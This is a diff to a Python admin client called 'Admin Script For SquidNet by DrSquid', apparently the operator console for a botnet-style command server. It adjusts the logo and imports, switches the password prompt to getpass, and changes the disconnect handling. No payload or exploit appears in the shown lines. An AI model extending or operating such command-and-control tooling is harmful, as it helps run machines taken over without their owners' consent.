@@ -1,4 +1,4 @@
-import socket, threading, os, sys, urllib.request, sqlite3, time
+import socket,threading, os, sys, sqlite3,getpass
 
 class Admin:
     def logo(self):
@@ -26,12 +26,12 @@ class Admin:
                                || || ||
                                || || ||
                                || || ||
-  _________            .__    .||_||_||__          __  ________      _____       .___      .__               ________     _______   
- /   _____/ ________ __|__| __| _/\      \   _____/  |_\_____  \    /  _  \    __| _/_____ |__| ____   ___  _\_____  \    \   _  \  
- \_____  \ / ____/  |  \  |/ __ | /   |   \_/ __ \   __\/  ____/   /  /_\  \  / __ |/     \|  |/    \  \  \/ / _(__  <    /  /_\  \ 
- /        < <_|  |  |  /  / /_/ |/    |    \  ___/|  | /       \  /    |    \/ /_/ |  Y Y  \  |   |  \  \   / /       \   \  \_/   \\
-/_______  /\__   |____/|__\____ |\____|__  /\___  >__| \_______ \ \____|__  /\____ |__|_|  /__|___|  /   \_/ /______  / /\ \_____  /
-        \/    |__|             || || ||  \/     \/             \/         \/      \/     \/        \/               \/  \/       \/ 
+  _________            .__    .||_||_||__          __  ________      _____       .___      .__               ________      ____ 
+ /   _____/ ________ __|__| __| _/\      \   _____/  |_\_____  \    /  _  \    __| _/_____ |__| ____   ___  _\_____  \    /_   |
+ \_____  \ / ____/  |  \  |/ __ | /   |   \_/ __ \   __\/  ____/   /  /_\  \  / __ |/     \|  |/    \  \  \/ / _(__  <     |   |
+ /        < <_|  |  |  /  / /_/ |/    |    \  ___/|  | /       \  /    |    \/ /_/ |  Y Y  \  |   |  \  \   / /       \    |   |
+/_______  /\__   |____/|__\____ |\____|__  /\___  >__| \_______ \ \____|__  /\____ |__|_|  /__|___|  /   \_/ /______  / /\ |___|
+        \/    |__|             || || ||  \/     \/             \/         \/      \/     \/        \/               \/  \/      
                                || || ||
                                || || ||
                                || || ||
@@ -44,10 +44,11 @@ class Admin:
                              ____-\/-____
                                  -__-
                                 /    \\
-Admin Script For SquidNet by DrSquid
+[+] Admin Script For SquidNet2 by DrSquid
         """
         return logo
     def __init__(self):
+        print(self.logo())
         self.dbfile = "servers.db"
         self.ftp = False
         self.first_msg_sent = False
@@ -55,7 +56,6 @@ Admin Script For SquidNet by DrSquid
         self.download_file = None
         self.filesize = 0
         self.bytesrecv = 0
-        print(self.logo())
         self.conf_db_file()
     def get_filename(self, msg):
         msg = msg.split()
@@ -212,7 +212,7 @@ Admin Script For SquidNet by DrSquid
                             self.downloading_file = True
                 else:
                     username = input("\n[+] Enter the Admin Account name: ")
-                    password = input("[+] Enter the Admin Account password: ")
+                    password = getpass.getpass("[+] Enter the Admin Account password: ")
                     msg = f"!login {username} {password}"
                     self.client.send(msg.encode())
                     msgback = self.client.recv(10240).decode()
@@ -232,7 +232,10 @@ Admin Script For SquidNet by DrSquid
                     print(msgback)
             except:
                 print("[+] Your connection to the server has been terminated. Please try and reconnecting to the server you were just on.")
-                reconnect = threading.Thread(target=self.connect).start()
+                try:
+                    self.client.close()
+                except:
+                    pass
                 break
 admin = Admin()
 admin.connect()
